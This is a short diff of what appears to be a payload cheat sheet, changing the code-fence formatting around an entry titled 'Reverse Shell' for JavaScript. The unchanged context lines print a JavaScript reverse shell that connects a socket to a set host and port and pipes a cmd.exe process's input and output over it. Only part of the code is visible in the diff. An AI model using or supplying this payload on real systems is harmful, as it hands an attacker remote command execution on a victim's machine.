@@ -2,7 +2,7 @@ javascript
 
 Reverse Shell
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+```js
 var host="localhost";
 var port=8044;
 var cmd="cmd.exe";
@@ -16,4 +16,5 @@ while(si.available()>0)po.write(si.read());
 so.flush();po.flush();java.lang.Thread.sleep(50);
 try {p.exitValue();break;}catch (e){}};p.destroy();
 s.close();
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+```
+
